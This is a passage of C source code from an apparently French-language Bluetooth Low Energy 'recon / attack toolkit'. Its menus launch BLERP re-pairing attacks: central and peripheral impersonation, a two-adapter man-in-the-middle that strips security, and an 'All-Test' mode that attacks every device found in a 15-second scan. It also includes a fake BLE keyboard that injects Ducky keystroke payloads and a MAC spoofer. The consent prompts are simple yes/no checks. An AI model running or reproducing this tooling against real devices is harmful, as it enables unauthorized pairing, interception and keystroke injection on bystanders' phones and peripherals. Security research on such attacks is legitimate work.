        struct smp_bond_info *pbond = (has_adapter && smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, target_str, &bond) == 0) ? &bond : NULL;

        bool authorized = false;
        if (is_suite_4) {
            authorized = run_blerp_all_4_tests((int)dev_id, target_addr, target_atype, target_str, target_name, target_rssi, pbond);
        } else {
            authorized = run_blerp_target_test((int)dev_id, type, target_addr, target_atype, target_str, target_name, target_rssi, pbond);
        }

        if (authorized) {
            banner_print_success(stdout);
        } else {
            printf("\n  %s[-] Le re-pairing n'a pas été autorisé ou la connexion a échoué.%s\n", UI_RED, UI_RESET);
        }
    }

    dev_table_free(&table);
    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// [-F-] Option Finale : One-touch scan (15s), consent validation messages,
// connection and re-pairing test (single target or All-Test), with green ASCII SUCCESS banner on authorization.
void menu_finale_wizard(int force_all_test) {
    signal(SIGINT, SIG_DFL);
    printf("\033[2J\033[H");
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %s%s[-F-] Option Finale : Scan 15s -> Test Connexion & Re-pairing%s\n", UI_YELLOW, UI_BOLD, UI_RESET);
    printf("  %s============================================================%s\n\n", UI_PURPLE, UI_RESET);

    printf("  %s[!] AVERTISSEMENT LÉGAL ET VÉRIFICATION DU CONSENTEMENT%s\n", UI_ORANGE, UI_RESET);
    printf("  %sCette opération automatisée va exécuter les étapes suivantes :%s\n", UI_PINK, UI_RESET);
    printf("    1. Scan radio BLE actif pendant 15 secondes pour détecter les cibles.\n");
    printf("    2. Tentative de connexion Link Layer vers l'appareil cible retenu (ou l'ensemble en All-Test).\n");
    printf("    3. Test d'attaque et de re-pairing SMP (référence sacca97/blerp, NDSS 2026).\n");
    printf("  %sCes actions sont strictement réservées aux équipements dont vous êtes%s\n", UI_PURPLE, UI_RESET);
    printf("  %spropriétaire ou pour lesquels vous détenez un mandat écrit d'audit.%s\n\n", UI_PURPLE, UI_RESET);

    // Validation 1 : Vérification formelle de l'autorisation
    printf("  %s[Validation 1/2] Autorisation légale d'audit :%s\n", UI_PINK, UI_RESET);
    if (!ask_yes_no("Autorisation", "confirmez-vous être propriétaire ou détenir un mandat d'audit", 0)) {
        printf("\n  %s[-] Opération annulée : autorisation requise pour continuer.%s\n", UI_RED, UI_RESET);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    // Sélection du mode d'attaque BLERP (sacca97/blerp)
    int all_test = 0;
    bool is_mitm = false;
    bool is_suite_4 = false;
    enum blerp_attack_type attack_type = BLERP_ATTACK_CI;
    if (force_all_test >= 0) {
        all_test = force_all_test;
    } else {
        printf("\n  %sModes d'attaque BLERP (sacca97/blerp NDSS 2026) :%s\n", UI_PINK, UI_RESET);
        printf("  %s[1]%s Central Impersonation (CI)     - Cible accessoire / périphérique [Défaut]\n", UI_YELLOW, UI_RESET);
        printf("  %s[2]%s Peripheral Impersonation (PI)  - Cible smartphone / centrale (Rejet V5)\n", UI_YELLOW, UI_RESET);
        printf("  %s[3]%s Double-Channel MitM (2 dev)   - Interception & stripping MITM/SC\n", UI_YELLOW, UI_RESET);
        printf("  %s[4]%s Audit complet V1-V6           - Cascade diagnostique multi-failles\n", UI_YELLOW, UI_RESET);
        printf("  %s[5]%s Suite Complète (4 Tests)      - CI + PI + Audit V1-V6 + Re-Pairing\n", UI_YELLOW, UI_RESET);
        printf("  %s[6]%s Option All-Test               - Tester le re-pairing sur TOUS les appareils\n", UI_YELLOW, UI_RESET);
        printf("  %sSélectionnez le mode [1-6, défaut: 1] : %s", UI_PINK, UI_RESET);
        fflush(stdout);
        char mline[16];
        if (read_line(mline, sizeof mline) == 0 && mline[0] != '\0') {
            if (mline[0] == '2') attack_type = BLERP_ATTACK_PI;
            else if (mline[0] == '3') is_mitm = true;
            else if (mline[0] == '4') attack_type = BLERP_ATTACK_AUDIT;
            else if (mline[0] == '5') is_suite_4 = true;
            else if (mline[0] == '6') all_test = 1;
            else attack_type = BLERP_ATTACK_CI;
        }
    }

    if (all_test && !is_suite_4) {
        printf("\n  %sMode d'attaque pour la séquence All-Test :%s\n", UI_PINK, UI_RESET);
        printf("  %s[1]%s Central Impersonation (CI) [Défaut]\n", UI_YELLOW, UI_RESET);
        printf("  %s[2]%s Peripheral Impersonation (PI)\n", UI_YELLOW, UI_RESET);
        printf("  %s[3]%s Audit complet V1-V6\n", UI_YELLOW, UI_RESET);
        printf("  %s[4]%s Suite Complète 4 Tests\n", UI_YELLOW, UI_RESET);
        printf("  %sSélectionnez [1-4, défaut 1] : %s", UI_PINK, UI_RESET);
        fflush(stdout);
        char atsel[16];
        if (read_line(atsel, sizeof atsel) == 0 && atsel[0] != '\0') {
            if (atsel[0] == '2') attack_type = BLERP_ATTACK_PI;
            else if (atsel[0] == '3') attack_type = BLERP_ATTACK_AUDIT;
            else if (atsel[0] == '4') is_suite_4 = true;
            else attack_type = BLERP_ATTACK_CI;
        }
    }

    const char *sel_name = is_mitm ? "Double-Channel MitM (2 adaptateurs)" :
                           is_suite_4 ? (all_test ? "All-Test (Suite Complète 4 Tests)" : "Suite Complète (4 Tests BLERP)") :
                           all_test ? (attack_type == BLERP_ATTACK_PI ? "All-Test (PI sur toutes les cibles)" :
                                       attack_type == BLERP_ATTACK_AUDIT ? "All-Test (Audit V1-V6 sur toutes les cibles)" :
                                       "All-Test (CI sur toutes les cibles)") :
                           (attack_type == BLERP_ATTACK_PI) ? "Peripheral Impersonation (PI)" :
                           (attack_type == BLERP_ATTACK_AUDIT) ? "Audit Complet V1-V6" :
                           "Central Impersonation (CI)";

    // Validation 2 : Consentement explicite de l'opérateur
    printf("\n  %s[Validation 2/2] Consentement explicite de l'opérateur :%s\n", UI_PINK, UI_RESET);
    printf("  %sMode sélectionné : %s%s%s\n", UI_PURPLE, UI_BOLD, sel_name, UI_RESET);
    printf("  %sConsentez-vous expressément à l'exécution de l'opération ?%s\n", UI_PURPLE, UI_RESET);
    printf("  %sTapez 'OUI' pour valider et continuer (toute autre saisie annule) : %s", UI_PINK, UI_RESET);
    fflush(stdout);
    char consent[32];
    if (read_line(consent, sizeof consent) < 0 ||
        (strcmp(consent, "oui") != 0 && strcmp(consent, "OUI") != 0 &&
         strcmp(consent, "yes") != 0 && strcmp(consent, "YES") != 0)) {
        printf("\n  %s[-] Opération annulée : consentement non accordé.%s\n", UI_RED, UI_RESET);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    if (is_mitm) {
        int dev_id = bleurp_hci_find_default_dev();
        long dev_id2 = ask_number("Interface secondaire", "index HCI pour l'autre rôle (ex: 1)", 1);
        struct blerp_attack_config cfg;
        blerp_config_init(&cfg, BLERP_ATTACK_MITM);
        cfg.dev_id = dev_id;
        cfg.dev_id_sec = (int)dev_id2;
        struct blerp_attack_report rep;
        blerp_run_mitm(&cfg, &rep);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    printf("\n  %s[+] Consentement validé (%s). Lancement automatique du scan BLE (15 secondes)...%s\n\n",
           UI_GREEN, sel_name, UI_RESET);

    int dev_id = bleurp_hci_find_default_dev();
    struct dev_table table;
    if (dev_table_init(&table) < 0) {
        perror("dev_table_init");
        return;
    }

    int rc = run_scan(dev_id, 15, 1, &table);
    if (rc < 0) {
        printf("\n  %s[-] Scan indisponible (vérifiez les permissions ou l'adaptateur).%s\n", UI_RED, UI_RESET);
        dev_table_free(&table);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    char adapter[18];
    bool has_adapter = (smp_adapter_addr(dev_id, adapter) == 0);
    char bonded_list[32][18];
    int n_bonds = 0;
    if (has_adapter) {
        n_bonds = smp_bond_list(BLEURP_BLUEZ_STORE_DIR, adapter, bonded_list, 32);
        if (n_bonds < 0) n_bonds = 0;
    }

    dev_table_sort_by_rssi(&table);
    size_t count = dev_table_count(&table);

    if (count == 0 && n_bonds == 0) {
        printf("\n  %s[-] Aucun appareil détecté après 15s de scan et aucun bond connu.%s\n", UI_RED, UI_RESET);
        dev_table_free(&table);
        printf("\n(entree pour continuer) ");
        fflush(stdout);
        char b[8];
        (void)read_line(b, sizeof b);
        return;
    }

    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %sAppareils détectés pendant le scan (15s) : %zu trouvé(s)%s\n", UI_YELLOW, count, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);

    char row[192];
    size_t shown = count < 10 ? count : 10;
    for (size_t i = 0; i < shown; i++) {
        const struct dev_entry *e = dev_table_at(&table, i);
        ui_format_row(row, sizeof row, (int)i + 1, e);
        printf("  %s\n", row);
    }

    if (all_test) {
        printf("\n  %s[*] Démarrage de la séquence All-Test BLERP [%s] sur %zu appareil(s) (Ctrl-C pour interrompre)...%s\n",
               UI_YELLOW, sel_name, count, UI_RESET);

        signal(SIGINT, on_sigint);
        g_stop = 0;

        int total_tested = 0;
        int total_authorized = 0;

        for (size_t i = 0; i < count && !g_stop; i++) {
            const struct dev_entry *e = dev_table_at(&table, i);
            char as[18];
            snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
                     e->address[5], e->address[4], e->address[3],
                     e->address[2], e->address[1], e->address[0]);
            const char *name = (e->has_name && e->name[0]) ? e->name : "Inconnu";

            printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
            printf("  [%zu/%zu] Cible : %s%s%s (%s, RSSI: %d dBm)\n",
                   i + 1, count, UI_PINK, as, UI_RESET, name, (int)e->rssi);

            struct smp_bond_info bond;
            struct smp_bond_info *pbond = (has_adapter && smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, as, &bond) == 0) ? &bond : NULL;

            bool auth = false;
            if (is_suite_4) {
                auth = run_blerp_all_4_tests(dev_id, e->address, e->addr_type, as, name, e->rssi, pbond);
            } else {
                auth = run_blerp_target_test(dev_id, attack_type, e->address, e->addr_type, as, name, e->rssi, pbond);
            }
            if (auth) {
                total_authorized++;
            }
            total_tested++;
        }

        signal(SIGINT, SIG_DFL);

        printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
        printf("  %sSynthèse All-Test BLERP : %d / %d appareil(s) vulnérable(s) au re-pairing%s\n",
               total_authorized > 0 ? UI_GREEN : UI_YELLOW, total_authorized, total_tested, UI_RESET);
        printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);

        if (total_authorized > 0) {
            banner_print_success(stdout);
        } else {
            printf("\n  %s[-] Aucun appareil n'a autorisé le re-pairing lors du All-Test BLERP.%s\n", UI_RED, UI_RESET);
        }
    } else {
        // Mode cible unique : priorité ou sélection manuelle par l'opérateur
        const struct dev_entry *target = NULL;
        if (count > 1) {
            printf("\n  %sNuméro de l'appareil à tester (1-%zu, [1] par défaut, 'A' pour All-Test) : %s", UI_PINK, shown, UI_RESET);
            fflush(stdout);
            char pnum[16];
            if (read_line(pnum, sizeof pnum) == 0 && pnum[0] != '\0') {
                if (pnum[0] == 'a' || pnum[0] == 'A') {
                    all_test = 1;
                } else {
                    int idx = atoi(pnum);
                    if (idx >= 1 && (size_t)idx <= count) {
                        target = dev_table_at(&table, (size_t)idx - 1);
                    }
                }
            }
        }

        if (all_test) {
            printf("\n  %s[*] Démarrage de la séquence All-Test BLERP [%s] sur %zu appareil(s) (Ctrl-C pour interrompre)...%s\n",
                   UI_YELLOW, sel_name, count, UI_RESET);

            signal(SIGINT, on_sigint);
            g_stop = 0;

            int total_tested = 0;
            int total_authorized = 0;

            for (size_t i = 0; i < count && !g_stop; i++) {
                const struct dev_entry *e = dev_table_at(&table, i);
                char as[18];
                snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
                         e->address[5], e->address[4], e->address[3],
                         e->address[2], e->address[1], e->address[0]);
                const char *name = (e->has_name && e->name[0]) ? e->name : "Inconnu";

                printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
                printf("  [%zu/%zu] Cible : %s%s%s (%s, RSSI: %d dBm)\n",
                       i + 1, count, UI_PINK, as, UI_RESET, name, (int)e->rssi);

                struct smp_bond_info bond;
                struct smp_bond_info *pbond = (has_adapter && smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, as, &bond) == 0) ? &bond : NULL;

                bool auth = false;
                if (is_suite_4) {
                    auth = run_blerp_all_4_tests(dev_id, e->address, e->addr_type, as, name, e->rssi, pbond);
                } else {
                    auth = run_blerp_target_test(dev_id, attack_type, e->address, e->addr_type, as, name, e->rssi, pbond);
                }
                if (auth) {
                    total_authorized++;
                }
                total_tested++;
            }

            signal(SIGINT, SIG_DFL);

            printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
            printf("  %sSynthèse All-Test BLERP : %d / %d appareil(s) vulnérable(s) au re-pairing%s\n",
                   total_authorized > 0 ? UI_GREEN : UI_YELLOW, total_authorized, total_tested, UI_RESET);
            printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);

            if (total_authorized > 0) {
                banner_print_success(stdout);
            } else {
                printf("\n  %s[-] Aucun appareil n'a autorisé le re-pairing lors du All-Test BLERP.%s\n", UI_RED, UI_RESET);
            }
        } else {
            if (!target) {
                for (size_t i = 0; i < count; i++) {
                    const struct dev_entry *e = dev_table_at(&table, i);
                    char as[18];
                    snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
                             e->address[5], e->address[4], e->address[3],
                             e->address[2], e->address[1], e->address[0]);
                    for (int b = 0; b < n_bonds; b++) {
                        if (strcasecmp(as, bonded_list[b]) == 0) {
                            target = e;
                            break;
                        }
                    }
                    if (target) break;
                }
                if (!target && count > 0) {
                    target = dev_table_at(&table, 0);
                }
            }

            uint8_t target_addr[6];
            uint8_t target_atype = BLEURP_BDADDR_LE_PUBLIC;
            char target_str[18] = "";
            char target_name[256] = "Inconnu";
            int8_t target_rssi = -100;

            if (target) {
                memcpy(target_addr, target->address, 6);
                target_atype = target->addr_type;
                target_rssi = target->rssi;
                snprintf(target_str, sizeof target_str, "%02X:%02X:%02X:%02X:%02X:%02X",
                         target_addr[5], target_addr[4], target_addr[3],
                         target_addr[2], target_addr[1], target_addr[0]);
                if (target->has_name && target->name[0]) {
                    snprintf(target_name, sizeof target_name, "%s", target->name);
                }
            } else if (n_bonds > 0) {
                parse_addr(bonded_list[0], target_addr);
                snprintf(target_str, sizeof target_str, "%s", bonded_list[0]);
                target_atype = BLEURP_BDADDR_LE_PUBLIC;
                snprintf(target_name, sizeof target_name, "Bond BlueZ");
            }

            struct smp_bond_info bond;
            struct smp_bond_info *pbond = (has_adapter && smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, target_str, &bond) == 0) ? &bond : NULL;

            bool authorized = false;
            if (is_suite_4) {
                authorized = run_blerp_all_4_tests(dev_id, target_addr, target_atype, target_str, target_name, target_rssi, pbond);
            } else {
                authorized = run_blerp_target_test(dev_id, attack_type, target_addr, target_atype, target_str, target_name, target_rssi, pbond);
            }

            if (authorized) {
                banner_print_success(stdout);
            } else {
                printf("\n  %s[-] Le re-pairing n'a pas été autorisé ou la connexion a échoué.%s\n", UI_RED, UI_RESET);
            }
        }
    }

    dev_table_free(&table);
    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

int cmd_keyboard(int argc, char **argv) {
    int dev_id = bleurp_hci_find_default_dev();
    const char *name = "BLEURP Keyboard";
    uint8_t auth = 0x01; // Bonding
    uint8_t keysize = 16;
    uint8_t iocap = 0x03; // NoInputNoOutput (Just Works)
    const char *payload = NULL;

    int opt;
    optind = 1;
    while ((opt = getopt(argc, argv, "i:n:a:k:o:d:h")) != -1) {
        switch (opt) {
            case 'i': {
                // Accept "hci1" as well as "1", matching the usage line.
                const char *num = (strncmp(optarg, "hci", 3) == 0) ? optarg + 3 : optarg;
                long idx;
                if (parse_long_arg(num, 10, 0, 255, &idx) < 0) {
                    fprintf(stderr, "keyboard: -i invalide '%s' (attendu hciN ou un index 0-255)\n", optarg);
                    return 1;
                }
                dev_id = (int)idx;
                break;
            }
            case 'n': name = optarg; break;
            case 'a': auth = (uint8_t)strtol(optarg, NULL, 0); break;
            case 'k': keysize = (uint8_t)strtol(optarg, NULL, 0); break;
            case 'o': iocap = (uint8_t)strtol(optarg, NULL, 0); break;
            case 'd': payload = optarg; break;
            case 'h':
            default:
                fprintf(stderr, "Usage: bleurp keyboard [-i hciX] [-n name] [-a authreq_hex] [-k keysize] [-o iocap] [-d payload.ducky]\n");
                return 1;
        }
    }

    struct peripheral_config cfg = {
        .dev_id = dev_id,
        .device_name = name,
        .io_capability = iocap,
        .auth_req = auth,
        .max_key_size = keysize,
        .trigger_sec_req = true,
        .payload_file = payload
    };

    return peripheral_keyboard_run(&cfg);
}
int cmd_menu(void) {
    for (;;) {
        signal(SIGINT, SIG_DFL); // Ctrl-C at the menu exits
        printf("\033[2J\033[H");
        banner_print(stdout);
        printf("\n  %sBLE recon%s %s/%s%s attack toolkit%s\n",
               UI_PINK, UI_RESET, UI_PURPLE, UI_RESET, UI_PINK, UI_RESET);
        printf("  %s------------------------------------------------------------%s\n",
               UI_PURPLE, UI_RESET);
        printf("  %s[-0-]%s Suite Audit   %spipeline tout-en-un (Scan -> GATT -> SMP -> HID)%s\n",
               UI_GREEN, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-1-]%s Scan          %sdecouverte BLE en direct + fingerprint%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-2-]%s Enum GATT     %sconnexion a un appareil, arbre GATT%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-3-]%s HID Payload   %sinjection de frappes (BLE HID)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-4-]%s MAC Spoofer   %sadresse aleatoire statique (LE)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-5-]%s SMP Probe     %ssonde d'appairage native (HCI User Channel)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-6-]%s BLE Keyboard  %sémulateur clavier HID (HOGP Périphérique)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-7-]%s Re-pairing    %scheck de re-pairing sur un bond (BLERP)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-8-]%s Security Req  %stest Security Request sur un bond (BLERP)%s\n",
               UI_YELLOW, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-9-]%s Tout tester   %sscan, puis connexion + GATT sur chaque appareil%s\n",
               UI_ORANGE, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-A-]%s Audit complet %sscripts/audit_ble.sh : identification -> rapport%s\n",
               UI_GREEN, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-B-]%s BLERP Attack  %sattaques re-pairing (CI, PI, MitM, Audit NDSS 2026)%s\n",
               UI_GREEN, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-F-]%s Option Finale %sscan 15s, validation consentement, test re-pairing -> SUCCESS%s\n",
               UI_GREEN, UI_RESET, UI_PURPLE, UI_RESET);
        printf("  %s[-Q-]%s Quitter%s\n\n> ", UI_PINK, UI_RESET, UI_RESET);
        fflush(stdout);

        char line[64];
        if (read_line(line, sizeof line) < 0) return 0;
        if (line[0] == 'q' || line[0] == 'Q') return 0;

        if (line[0] == '0') {
            menu_guided_audit_wizard();
        } else if (line[0] == '1') {
            menu_scan_wizard();
        } else if (line[0] == '2') {
            signal(SIGINT, SIG_DFL);
            printf("%sAddress%s (AA:BB:CC:DD:EE:FF): ", UI_PINK, UI_RESET);
            fflush(stdout);
            char a[64];
            if (read_line(a, sizeof a) == 0) {
                uint8_t addr[6];
                if (parse_addr(a, addr) == 0) {
                    printf("%sType%s (public/random) [public]: ", UI_PINK, UI_RESET);
                    fflush(stdout);
                    char t[16];
                    uint8_t at = BLEURP_BDADDR_LE_PUBLIC;
                    if (read_line(t, sizeof t) == 0 && strncmp(t, "random", 6) == 0) {
                        at = BLEURP_BDADDR_LE_RANDOM;
                    }
                    do_enum(addr, at);
                } else {
                    printf("invalid address\n");
                }
            }
            printf("\n(enter to continue) ");
            fflush(stdout);
            char b[8];
            (void)read_line(b, sizeof b);
        } else if (line[0] == '3') {
            run_hid_wizard(NULL);
        } else if (line[0] == '4') {
            menu_mac_spoofer();
        } else if (line[0] == '5') {
            menu_smp_wizard();
        } else if (line[0] == '6') {
            menu_keyboard_wizard();
        } else if (line[0] == '7') {
            menu_repair_wizard();
        } else if (line[0] == '8') {
            menu_secreq_wizard();
        } else if (line[0] == '9') {
            menu_autotry_wizard();
        } else if (line[0] == 'a' || line[0] == 'A') {
            menu_audit_script();
        } else if (line[0] == 'b' || line[0] == 'B') {
            menu_blerp_wizard();
        } else if (line[0] == 'f' || line[0] == 'F') {
            menu_finale_wizard(-1);
        }
    }
}

